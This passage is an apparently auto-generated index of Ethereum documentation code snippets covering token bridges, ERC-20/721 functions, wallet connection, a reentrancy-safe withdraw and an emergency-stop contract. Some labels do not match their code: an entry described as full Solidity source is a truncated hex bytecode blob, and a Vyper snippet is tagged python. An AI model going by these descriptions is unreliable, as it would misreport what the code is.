withdrawals from L2 to L1. It's called via the cross-domain messenger and verifies the caller is authorized. The function updates the deposits tracking, transfers tokens to the recipient, and emits an event.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction finalizeERC20Withdrawal(\n    address _l1Token,\n    address _l2Token,\n    address _from,\n    address _to,\n    uint256 _amount,\n    bytes calldata _data\n) external onlyFromCrossDomainAccount(l2TokenBridge) {\n    deposits[_l1Token][_l2Token] = deposits[_l1Token][_l2Token] - _amount;\n    \n    // When a withdrawal is finalized on L1, the L1 Bridge transfers the funds to the withdrawer\n    // slither-disable-next-line reentrancy-events\n    IERC20(_l1Token).safeTransfer(_to, _amount);\n    \n    // slither-disable-next-line reentrancy-events\n    emit ERC20WithdrawalFinalized(_l1Token, _l2Token, _from, _to, _amount, _data);\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing approve Method for ERC-721 Tokens\nDESCRIPTION: The approve function allows token owners to authorize a specific address to transfer a particular token. It includes checks to ensure the token exists, the approved address isn't the owner, and the caller is authorized.\n\nLANGUAGE: python\nCODE:\n```\n@external\ndef approve(_approved: address, _tokenId: uint256):\n    \"\"\"\n    @dev Set or reaffirm the approved address for an NFT. The zero address indicates there is no approved address.\n         Throws unless `msg.sender` is the current NFT owner, or an authorized operator of the current owner.\n         Throws if `_tokenId` is not a valid NFT. (NOTE: This is not written the EIP)\n         Throws if `_approved` is the current owner. (NOTE: This is not written the EIP)\n    @param _approved Address to be approved for the given NFT ID.\n    @param _tokenId ID of the token to be approved.\n    \"\"\"\n    owner: address = self.idToOwner[_tokenId]\n    # Throws if `_tokenId` is not a valid NFT\n    assert owner != ZERO_ADDRESS\n    # Throws if `_approved` is the current owner\n    assert _approved != owner\n```\n\n----------------------------------------\n\nTITLE: Implementing _mint Function in ERC-20 Contract\nDESCRIPTION: Internal function to create new tokens and assign them to an account, increasing the total supply. Only accounts implementing this contract can mint tokens based on their own business logic. Emits a Transfer event from the zero address.\n\nLANGUAGE: solidity\nCODE:\n```\n/** @dev Creates `amount` tokens and assigns them to `account`, increasing\n * the total supply.\n *\n * Emits a {Transfer} event with `from` set to the zero address.\n *\n * Requirements:\n *\n * - `to` cannot be the zero address.\n */\nfunction _mint(address account, uint256 amount) internal virtual {\n    require(account != address(0), \"ERC20: mint to the zero address\");\n    _beforeTokenTransfer(address(0), account, amount);\n    _totalSupply = _totalSupply.add(amount);\n    _balances[account] = _balances[account].add(amount);\n    emit Transfer(address(0), account, amount);\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing burn Function in ERC-721 Vyper Contract\nDESCRIPTION: This function destroys an existing token, removing it from circulation. It verifies that the caller is authorized to manage the token, clears any approvals, and emits a Transfer event to the zero address.\n\nLANGUAGE: vyper\nCODE:\n```\n@external\ndef burn(_tokenId: uint256):\n    \"\"\"\n    @dev Burns a specific ERC721 token.\n         Throws unless `msg.sender` is the current owner, an authorized operator, or the approved\n         address for this NFT.\n         Throws if `_tokenId` is not a valid NFT.\n    @param _tokenId uint256 id of the ERC721 token to be burned.\n    \"\"\"\n    # Check requirements\n    assert self._isApprovedOrOwner(msg.sender, _tokenId)\n    owner: address = self.idToOwner[_tokenId]\n    # Throws if `_tokenId` is not a valid NFT\n    assert owner != ZERO_ADDRESS\n    self._clearApproval(owner, _tokenId)\n    self._removeTokenFrom(owner, _tokenId)\n    log Transfer(owner, ZERO_ADDRESS, _tokenId)\n```\n\n----------------------------------------\n\nTITLE: Emitting Transfer Event in ERC-20 Implementation\nDESCRIPTION: This line emits a Transfer event after a successful token transfer. Events are crucial for off-chain applications like wallets to track token movements and update user interfaces accordingly.\n\nLANGUAGE: solidity\nCODE:\n```\nemit Transfer(sender, recipient, amount);\n}\n```\n\n----------------------------------------\n\nTITLE: Completing ERC-20 Transfer Implementation in Solidity\nDESCRIPTION: This code completes the transfer function by calling the internal _transfer function and returning true upon success. It uses _msgSender() instead of msg.sender for OpenGSN compatibility to support gasless transactions.\n\nLANGUAGE: solidity\nCODE:\n```\n    _transfer(_msgSender(), recipient, amount);\n    return true;\n}\n```\n\n----------------------------------------\n\nTITLE: MetaMask Wallet Connection Implementation in JavaScript\nDESCRIPTION: JavaScript function that handles connecting to MetaMask wallet. It checks if MetaMask is installed, requests account access, and returns the user's Ethereum address or appropriate error messages based on the connection status.\n\nLANGUAGE: javascript\nCODE:\n```\n// interact.js\n\nexport const connectWallet = async () => {\n  if (window.ethereum) {\n    try {\n      const addressArray = await window.ethereum.request({\n        method: \"eth_requestAccounts\",\n      })\n      const obj = {\n        status: \"👆🏽 Write a message in the text-field above.\",\n        address: addressArray[0],\n      }\n      return obj\n    } catch (err) {\n      return {\n        address: \"\",\n        status: \"😥 \" + err.message,\n      }\n    }\n  } else {\n    return {\n      address: \"\",\n      status: (\n        <span>\n          <p>\n            {\" \"}\n            🦊 <a target=\"_blank\" href={`https://metamask.io/download.html`}>\n              You must install MetaMask, a virtual Ethereum wallet, in your\n              browser.\n            </a>\n          </p>\n        </span>\n      ),\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing the DEX Buy Function for Token Purchase with Ether\nDESCRIPTION: The buy function allows users to send ether to the contract and receive tokens in return. It checks if the user sent enough ether and if the contract has enough tokens in reserve before performing the exchange.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction buy() payable public {\n    uint256 amountTobuy = msg.value;\n    uint256 dexBalance = token.balanceOf(address(this));\n    require(amountTobuy > 0, \"You need to send some ether\");\n    require(amountTobuy <= dexBalance, \"Not enough tokens in the reserve\");\n    token.transfer(msg.sender, amountTobuy);\n    emit Bought(amountTobuy);\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing EIP-712 Permit Function for Gasless Approvals in Solidity\nDESCRIPTION: Defines the permit function that allows token approvals via signatures without requiring the owner to spend gas. Takes signature components (v, r, s) along with approval parameters to verify and process off-chain approvals.\n\nLANGUAGE: solidity\nCODE:\n```\n    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external {\n```\n\n----------------------------------------\n\nTITLE: Implementing ERC20 Token Contract in Solidity\nDESCRIPTION: This code implements a complete ERC20 token contract with standard functionality including token transfers, approvals, and balance management. The contract initializes with a name 'Basic', symbol 'BSC', and decimals value of 18. It includes SafeMath functionality to prevent overflow in arithmetic operations.\n\nLANGUAGE: solidity\nCODE:\n```\n60806040523480156200001157600080fd5b506040516200153938038062001539833981810160405260208110156200003757600080fd5b81019080805190602001909291905050506040518060400160405280600581526020017f42617369630000000000000000000000000000000000000000000000000000008152506040518060400160405280600381526020017f42534300000000000000000000000000000000000000000000000000000000008152508160039080519060200190620000cc92919062000389565b508060049080519060200190620000e592919062000389565b506012600560006101000a81548160ff021916908360ff16021790555050506200011633826200011d60201b60201c565b5062000438565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415620001c1576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601f8152602001807f45524332303a206d696e7420746f20746865207a65726f20616464726573730081525060200191505060405180910390fd5b620001d560008383620002fb60201b60201c565b620001f1816002546200030060201b62000f2d1790919060201c565b6002819055506200024f816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546200030060201b62000f2d1790919060201c565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a35050565b505050565b6000808284019050838110156200037f576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b8091505092915050565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f10620003cc57805160ff1916838001178555620003fd565b82800160010185558215620003fd579182015b82811115620003fc578251825591602001919060010190620003df565b5b5090506200040c919062000410565b5090565b6200043591905b808211156200043157600081600090555060010162000417565b5090565b90565b6110f180620004486000396000f3fe608060405234801561001057600080fd5b50600436106100a95760003560e01c80633950935111610071578063395093511461025f57806370a08231146102c557806395d89b411461031d578063a457c2d7146103a0578063a9059cbb14610406578063dd62ed3e1461046c576100a9565b806306fdde03146100ae578063095ea7b31461013157806318160ddd1461019757806323b872dd146101b5578063313ce5671461023b575b600080fd5b6100b66104e4565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100f65780820151818401526020810190506100db565b50505050905090810190601f1680156101235780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b61017d6004803603604081101561014757600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610586565b604051808215151515815260200191505060405180910390f35b61019f6105a4565b6040518082815260200191505060405180910390f35b610221600480360360608110156101cb57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506105ae565b604051808215151515815260200191505060405180910390f35b610243610687565b604051808260ff1660ff16815260200191505060405180910390f35b6102ab6004803603604081101561027557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061069e565b604051808215151515815260200191505060405180910390f35b610307600480360360208110156102db57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610751565b6040518082815260200191505060405180910390f35b610325610799565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561036557808201518184015260208101905061034a565b50505050905090810190601f1680156103925780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6103ec600480360360408110156103b657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061083b565b604051808215151515815260200191505060405180910390f35b6104526004803603604081101561041c57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610908565b604051808215151515815260200191505060405180910390f35b6104ce6004803603604081101561048257600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610926565b6040518082815260200191505060405180910390f35b606060038054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561057c5780601f106105515761010080835404028352916020019161057c565b820191906000526020600020905b81548152906001019060200180831161055f57829003601f168201915b5050505050905090565b600061059a6105936109ad565b84846109b5565b6001905092915050565b6000600254905090565b60006105bb848484610bac565b61067c846105c76109ad565b6106778560405180606001604052806028815260200161102660289139600160008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600061062d6109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6109b5565b600190509392505050565b6000600560009054906101000a900460ff16905090565b60006107476106ab6109ad565b8461074285600160006106bc6109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610f2d90919063ffffffff16565b6109b5565b6001905092915050565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b606060048054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156108315780601f1061080657610100808354040283529160200191610831565b820191906000526020600020905b81548152906001019060200180831161081457829003601f168201915b5050505050905090565b60006108fe6108486109ad565b846108f98560405180606001604052806025815260200161109760259139600160006108726109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6109b5565b6001905092915050565b600061091c6109156109ad565b8484610bac565b6001905092915050565b6000600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b600033905090565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610a3b576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260248152602001806110736024913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610ac1576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526022815260200180610fde6022913960400191505060405180910390fd5b80600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925836040518082815260200191505060405180910390a3505050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610c32576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602581526020018061104e6025913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610cb8576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526023815260200180610fbb6023913960400191505060405180910390fd5b610cc3838383610fb5565b610d2e81604051806060016040528060268152602001611000602691396000808773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610dc1816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610f2d90919063ffffffff16565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a3505050565b6000838311158290610f1a576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b83811015610edf578082015181840152602081019050610ec4565b50505050905090810190601f168015610f0c5780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b5060008385039050809150509392505050565b600080828401905\n```\n\n----------------------------------------\n\nTITLE: Installing dotenv for Environment Variable Management\nDESCRIPTION: Command to install the dotenv package which allows storing sensitive information like private keys and API URLs in a .env file.\n\nLANGUAGE: bash\nCODE:\n```\nnpm install dotenv --save\n```\n\n----------------------------------------\n\nTITLE: Enhanced useEffect Hook with Wallet Listener\nDESCRIPTION: Updated useEffect hook that both checks for existing wallet connections and sets up the wallet listener for account changes. This combines both initialization and ongoing state management for wallet connectivity.\n\nLANGUAGE: javascript\nCODE:\n```\nuseEffect(async () => {\n  const { address, status } = await getCurrentWalletConnected()\n  setWallet(address)\n  setStatus(status)\n\n  addWalletListener()\n}, [])\n```\n\n----------------------------------------\n\nTITLE: Creating an NFT Minting Transaction\nDESCRIPTION: Complete function to mint an NFT by creating a transaction with the appropriate parameters including nonce, gas, and contract method calls. This prepares the transaction for signing and sending to the blockchain.\n\nLANGUAGE: javascript\nCODE:\n```\n   require('dotenv').config();\n   const API_URL = process.env.API_URL;\n   const PUBLIC_KEY = process.env.PUBLIC_KEY;\n   const PRIVATE_KEY = process.env.PRIVATE_KEY;\n\n   const { createAlchemyWeb3 } = require(\"@alch/alchemy-web3\");\n   const web3 = createAlchemyWeb3(API_URL);\n\n   const contract = require(\"../artifacts/contracts/MyNFT.sol/MyNFT.json\");\n   const contractAddress = \"0x5a738a5c5fe46a1fd5ee7dd7e38f722e2aef7778\";\n   const nftContract = new web3.eth.Contract(contract.abi, contractAddress);\n\n   async function mintNFT(tokenURI) {\n     const nonce = await web3.eth.getTransactionCount(PUBLIC_KEY, 'latest'); //get latest nonce\n\n   //the transaction\n     const tx = {\n       'from': PUBLIC_KEY,\n       'to': contractAddress,\n       'nonce': nonce,\n       'gas': 500000,\n       'data': nftContract.methods.mintNFT(PUBLIC_KEY, tokenURI).encodeABI()\n     };\n   }​\n```\n\n----------------------------------------\n\nTITLE: Implementing Checks-Effects-Interactions Pattern in Solidity to Prevent Reentrancy\nDESCRIPTION: A revised version of a vulnerable contract that implements the checks-effects-interactions pattern to prevent reentrancy attacks. This pattern orders execution by performing checks first, then making state changes, and finally interacting with external contracts.\n\nLANGUAGE: solidity\nCODE:\n```\ncontract NoLongerAVictim {\n    function withdraw() external {\n        uint256 amount = balances[msg.sender];\n        balances[msg.sender] = 0;\n        (bool success, ) = msg.sender.call.value(amount)(\"\");\n        require(success);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing a Basic Token Contract in Solidity\nDESCRIPTION: A basic Token contract implementation that allows an owner to mint tokens and users to transfer tokens between addresses. The contract tracks token balances in a mapping, implements ownership control, and emits events for token transfers. It includes validation to prevent unauthorized minting and insufficient balance transfers.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity ^0.5.10;\n\ncontract Token {\n    // Egy `address` olyan, mint egy email cím - az Ethereum számlák beazonosítására szolgál.\n    // A címek okosszerződéseket vagy külső (felhasználói) számlákat jelölnek.\n    // Learn more: https://solidity.readthedocs.io/en/v0.5.10/types.html#address\n    address public owner;\n\n    // A `mapping` lényegében egy hash tábla adatszerkezet.\n    // Ez a `mapping` egy unsigned integert (a token egyenleget) rendel hozzá egy címhez (a token tartóhoz).\n    // További információ: https://solidity.readthedocs.io/en/v0.5.10/types.html#mapping-types\n    mapping (address => uint) public balances;\n\n    // Az eseményekkel lehet tevékenységet logolni a blokkláncon.\n    // Az Ethereum kliensek figyelhetik az eseményeket, hogy reagáljanak az szerződés állapotváltozásokra.\n    // További információ: https://solidity.readthedocs.io/en/v0.5.10/contracts.html#events\n    event Transfer(address from, address to, uint amount);\n\n    // Inicializálja a szerződés adatot, beállítja az `owner`\n    // változót a szerződés létrehozó címére.\n    constructor() public {\n        // Minden okosszerződés külső tranzakciókra hagyatkozik a függvényeik végrehajtására.\n        // az `msg` globális változó, mely az adott tranzakcióhoz tartozó adatot tartalmaz,\n        // mint a küldő címe és az ETH mennyisége a tranzakcióban.\n        //További információ: https://solidity.readthedocs.io/en/v0.5.10/units-and-global-variables.html#block-and-transaction-properties\n        owner = msg.sender;\n    }\n\n    // Új tokeneket hoz létre és elküldi egy címre.\n    function mint(address receiver, uint amount) public {\n        // A `require` egy kontrol struktúra, mely bizonyos feltételek betartatására szolgál.\n        // Ha a `require` állítás `false` értéket ad, egy kivétel triggerelődik,\n        // mely visszaállít minden állapotváltozást a jelenlegi hívás alatt.\n        // Learn more: https://solidity.readthedocs.io/en/v0.5.10/control-structures.html#error-handling-assert-require-revert-and-exceptions\n\n        // Only the contract owner can call this function\n        require(msg.sender == owner, \"You are not the owner.\");\n\n        // Enforces a maximum amount of tokens\n        require(amount < 1e60, \"Maximum issuance exceeded\");\n\n        // Increases the balance of `receiver` by `amount`\n        balances[receiver] += amount;\n    }\n\n    // Sends an amount of existing tokens from any caller to an address.\n    function transfer(address receiver, uint amount) public {\n        // A küldőnek elég tokennel kell rendelkeznie\n        require(amount <= balances[msg.sender], \"Insufficient balance.\");\n\n        // Beállítja a token a két cím token mennyiségét\n        balances[msg.sender] -= amount;\n        balances[receiver] += amount;\n\n        // Kibocsájtja a korábban definiált eseményt\n        emit Transfer(msg.sender, receiver, amount);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing the IL1ERC20Bridge Interface in Solidity\nDESCRIPTION: This code defines the IL1ERC20Bridge interface that facilitates the bridging of ERC-20 tokens between Ethereum Mainnet (L1) and Optimism (L2). It includes events for tracking deposits and withdrawals, and functions for initiating deposits and finalizing withdrawals.\n\nLANGUAGE: solidity\nCODE:\n```\n// SPDX-License-Identifier: MIT\npragma solidity >0.5.0 <0.9.0;\n\n/**\n * @title IL1ERC20Bridge\n */\ninterface IL1ERC20Bridge {\n    /**********\n     * Events *\n     **********/\n\n    event ERC20DepositInitiated(\n        address indexed _l1Token,\n        address indexed _l2Token,\n        address indexed _from,\n        address _to,\n        uint256 _amount,\n        bytes _data\n    );\n\n    event ERC20WithdrawalFinalized(\n        address indexed _l1Token,\n        address indexed _l2Token,\n        address indexed _from,\n        address _to,\n        uint256 _amount,\n        bytes _data\n    );\n\n    /********************\n     * Public Functions *\n     ********************/\n\n    /**\n     * @dev get the address of the corresponding L2 bridge contract.\n     * @return Address of the corresponding L2 bridge contract.\n     */\n    function l2TokenBridge() external returns (address);\n\n    /**\n     * @dev deposit an amount of the ERC20 to the caller's balance on L2.\n     * @param _l1Token Address of the L1 ERC20 we are depositing\n     * @param _l2Token Address of the L1 respective L2 ERC20\n     * @param _amount Amount of the ERC20 to deposit\n     * @param _l2Gas Gas limit required to complete the deposit on L2.\n     * @param _data Optional data to forward to L2. This data is provided\n     *        solely as a convenience for external contracts. Aside from enforcing a maximum\n     *        length, these contracts provide no guarantees about its content.\n     */\n    function depositERC20(\n        address _l1Token,\n        address _l2Token,\n        uint256 _amount,\n        uint32 _l2Gas,\n        bytes calldata _data\n    ) external;\n\n    /**\n     * @dev deposit an amount of ERC20 to a recipient's balance on L2.\n     * @param _l1Token Address of the L1 ERC20 we are depositing\n     * @param _l2Token Address of the L1 respective L2 ERC20\n     * @param _to L2 address to credit the withdrawal to.\n     * @param _amount Amount of the ERC20 to deposit.\n     * @param _l2Gas Gas limit required to complete the deposit on L2.\n     * @param _data Optional data to forward to L2. This data is provided\n     *        solely as a convenience for external contracts. Aside from enforcing a maximum\n     *        length, these contracts provide no guarantees about its content.\n     */\n    function depositERC20To(\n        address _l1Token,\n        address _l2Token,\n        address _to,\n        uint256 _amount,\n        uint32 _l2Gas,\n        bytes calldata _data\n    ) external;\n\n    /*************************\n     * Cross-chain Functions *\n     *************************/\n\n    /**\n     * @dev Complete a withdrawal from L2 to L1, and credit funds to the recipient's balance of the\n     * L1 ERC20 token.\n     * This call will fail if the initialized withdrawal from L2 has not been finalized.\n     *\n     * @param _l1Token Address of L1 token to finalizeWithdrawal for.\n     * @param _l2Token Address of L2 token where withdrawal was initiated.\n     * @param _from L2 address initiating the transfer.\n     * @param _to L1 address to credit the withdrawal to.\n     * @param _amount Amount of the ERC20 to deposit.\n     * @param _data Data provided by the sender on L2. This data is provided\n     *   solely as a convenience for external contracts. Aside from enforcing a maximum\n     *   length, these contracts provide no guarantees about its content.\n     */\n    function finalizeERC20Withdrawal(\n        address _l1Token,\n        address _l2Token,\n        address _from,\n        address _to,\n        uint256 _amount,\n        bytes calldata _data\n    ) external;\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Checks-Effects-Interactions Pattern in Solidity to Prevent Reentrancy\nDESCRIPTION: A revised version of a vulnerable contract that implements the checks-effects-interactions pattern to prevent reentrancy attacks. This pattern orders execution by performing checks first, then making state changes, and finally interacting with external contracts.\n\nLANGUAGE: solidity\nCODE:\n```\ncontract NoLongerAVictim {\n    function withdraw() external {\n        uint256 amount = balances[msg.sender];\n        balances[msg.sender] = 0;\n        (bool success, ) = msg.sender.call.value(amount)(\"\");\n        require(success);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Emergency Stop Pattern in Solidity Smart Contracts\nDESCRIPTION: A Solidity code example demonstrating the emergency stop (circuit breaker) pattern implementation. The contract includes a boolean state variable to track stopped status, modifiers to control function access during emergencies, and functions to stop and resume contract operations. This pattern allows for controlled shutdown of vulnerable functions while maintaining access to emergency operations.\n\nLANGUAGE: solidity\nCODE:\n```\n// This code has not been professionally audited and makes no promises about safety or correctness. Use at your own risk.\n\ncontract EmergencyStop {\n\n    bool isStopped = false;\n\n    modifier stoppedInEmergency {\n        require(!isStopped);\n        _;\n    }\n\n    modifier onlyWhenStopped {\n        require(isStopped);\n        _;\n    }\n\n    modifier onlyAuthorized {\n        // Check for authorization of msg.sender here\n        _;\n    }\n\n    function stopContract() public onlyAuthorized {\n        isStopped = true;\n    }\n\n    function resumeContract() public onlyAuthorized {\n        isStopped = false;\n    }\n\n    function deposit() public payable stoppedInEmergency {\n        // Deposit logic happening here\n    }\n\n    function emergencyWithdraw() public onlyWhenStopped {\n        // Emergency withdraw happening here\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Hello World Smart Contract in Solidity\nDESCRIPTION: A Solidity contract that stores and updates a message string. It includes a constructor for initialization, an update function that changes the message, and emits an event when the message is updated. The contract demonstrates basic Solidity patterns for state variables, functions, and events.\n\nLANGUAGE: solidity\nCODE:\n```\n// HelloWorld.sol\n\n// Specifies the version of Solidity, using semantic versioning.\n// Learn more: https://solidity.readthedocs.io/en/v0.5.10/layout-of-source-files.html#pragma\npragma solidity ^0.7.3;\n\n// Defines a contract named `HelloWorld`.\n// Un contrato es una colección de funciones y datos (su estado). Once deployed, a contract resides at a specific address on the Ethereum blockchain. Learn more: https://solidity.readthedocs.io/en/v0.5.10/structure-of-a-contract.html\ncontract HelloWorld {\n\n   //Emitted when update function is called\n   //Smart contract events are a way for your contract to communicate that something happened on the blockchain to your app front-end, which can be 'listening' for certain events and take action when they happen.\n   event UpdatedMessages(string oldStr, string newStr);\n\n   // Declares a state variable `message` of type `string`.\n   // Las variables de estado son variables cuyos valores se almacenan permanentemente en el almacenamiento del contrato. The keyword `public` makes variables accessible from outside a contract and creates a function that other contracts or clients can call to access the value.\n   string public message;\n\n   // Similar to many class-based object-oriented languages, a constructor is a special function that is only executed upon contract creation.\n   // Los constructores se utilizan para inicializar los datos del contrato. Learn more:https://solidity.readthedocs.io/en/v0.5.10/contracts.html#constructors\n   constructor(string memory initMessage) {\n\n      // Accepts a string argument `initMessage` and sets the value into the contract's `message` storage variable).\n      message = initMessage;\n   }\n\n   // A public function that accepts a string argument and updates the `message` storage variable.\n   function update(string memory newMessage) public {\n      string memory oldMsg = message;\n      message = newMessage;\n      emit UpdatedMessages(oldMsg, newMessage);\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Writing a Basic Hello World Smart Contract in Solidity\nDESCRIPTION: A simple Solidity smart contract that stores a message and allows it to be updated. The contract includes a constructor to initialize the message, an update function to change it, and an event to notify when the message is updated.\n\nLANGUAGE: solidity\nCODE:\n```\n// Specifica la versione di Solidity, utilizzando il controllo delle versioni semantico.\n// Learn more: https://solidity.readthedocs.io/en/v0.5.10/layout-of-source-files.html#pragma\npragma solidity >=0.7.3;\n\n// Defines a contract named `HelloWorld`.\n// Un contratto è una raccolta di funzioni e dati (il suo stato). Once deployed, a contract resides at a specific address on the Ethereum blockchain. Learn more: https://solidity.readthedocs.io/en/v0.5.10/structure-of-a-contract.html\ncontract HelloWorld {\n\n   //Emitted when update function is called\n   //Smart contract events are a way for your contract to communicate that something happened on the blockchain to your app front-end, which can be 'listening' for certain events and take action when they happen.\n   event UpdatedMessages(string oldStr, string newStr);\n\n   // Declares a state variable `message` of type `string`.\n   // Le variabili di stato sono variabili con valori memorizzati in modo permanente nello spazio di archiviazione (storage) del contratto. The keyword `public` makes variables accessible from outside a contract and creates a function that other contracts or clients can call to access the value.\n   string public message;\n\n   // Similar to many class-based object-oriented languages, a constructor is a special function that is only executed upon contract creation.\n   // I costruttori sono utilizzati per inizializzare i dati del contratto. Learn more:https://solidity.readthedocs.io/en/v0.5.10/contracts.html#constructors\n   constructor(string memory initMessage) {\n\n      // Accepts a string argument `initMessage` and sets the value into the contract's `message` storage variable).\n      message = initMessage;\n   }\n\n   // A public function that accepts a string argument and updates the `message` storage variable.\n   function update(string memory newMessage) public {\n      string memory oldMsg = message;\n      message = newMessage;\n      emit UpdatedMessages(oldMsg, newMessage);\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing a Simple Betting Game Smart Contract in Solidity\nDESCRIPTION: A simple Solidity smart contract that allows users to place bets. The contract tracks total games won and lost, and emits a BetPlaced event when a bet is placed. This demonstrates a data storage pattern that would be difficult to query without The Graph.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity 0.7.1;\n\ncontract Game {\n    uint256 totalGamesPlayerWon = 0;\n    uint256 totalGamesPlayerLost = 0;\n    event BetPlaced(address player, uint256 value, bool hasWon);\n\n    function placeBet() external payable {\n        bool hasWon = evaluateBetForPlayer(msg.sender);\n\n        if (hasWon) {\n            (bool success, ) = msg.sender.call{ value: msg.value * 2 }('');\n            require(success, \"Transfer failed\");\n            totalGamesPlayerWon++;\n        } else {\n            totalGamesPlayerLost++;\n        }\n\n        emit BetPlaced(msg.sender, msg.value, hasWon);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Ethers.js Utility Functions for ETH Value Formatting\nDESCRIPTION: Example of utility functions in Ethers.js for handling ETH values, including retrieving an account balance and formatting the output from Wei to Ether for better user readability.\n\nLANGUAGE: javascript\nCODE:\n```\n// Get the balance of an account (by address or ENS name)\nbalance = await provider.getBalance(\"ethers.eth\")\n// { BigNumber: \"2337132817842795605\" }\n\n// Often you will need to format the output for the user\n// which prefer to see values in ether (instead of wei)\nethers.utils.formatEther(balance)\n// '2.337132817842795605'\n```\n\n----------------------------------------\n\nTITLE: Swap Exact Tokens for ETH with Fee Support in Uniswap V2\nDESCRIPTION: External function that allows swapping a fixed amount of input tokens for a minimum amount of ETH, 